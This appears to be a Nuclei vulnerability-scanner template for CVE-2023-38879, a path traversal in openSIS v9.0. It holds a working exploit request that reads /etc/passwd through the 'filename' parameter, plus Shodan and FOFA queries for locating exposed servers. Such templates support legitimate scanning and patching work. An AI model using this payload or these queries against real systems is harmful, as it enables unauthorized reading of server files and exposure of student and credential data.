http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - condition: and
    part: header
    type: word
    words:
    - filename=
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/DownloadWindow.php?filename=../../../../../../../../etc/passwd'
id: CVE-2023-38879
info:
  author: haliteroglu
  classification:
    cpe: cpe:2.3:a:os4ed:opensis:9.0:*:*:*:community:*:*:*
    cve-id: CVE-2023-38879
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
    epss-percentile: 0.93787
    epss-score: 0.12827
  description: 'A path traversal vulnerability exists in openSIS Classic Community
    Edition v9.0 via the ''filename'' parameter in DownloadWindow.php. An unauthenticated
    remote attacker can exploit this to read arbitrary files on the server by manipulating
    file paths.

    '
  impact: 'Unauthenticated attackers can read arbitrary files from the server by manipulating
    the filename parameter in DownloadWindow.php, potentially exposing student records,
    staff information, and database credentials.

    '
  metadata:
    fofa-query: title="openSIS"
    max-request: 1
    product: opensis
    shodan-query: title:"openSIS"
    vendor: os4ed
    verified: true
  name: openSIS v9.0 - Path Traversal
  reference:
  - https://github.com/dub-flow/vulnerability-research/tree/main/CVE-2023-38879
  - https://nvd.nist.gov/vuln/detail/CVE-2023-38879
  remediation: 'Update openSIS to a version newer than 9.0 that validates file paths
    in DownloadWindow.php and restricts file access to authorized directories only.

    '
  severity: high
  tags: cve,cve2023,opensis,lfi,vuln
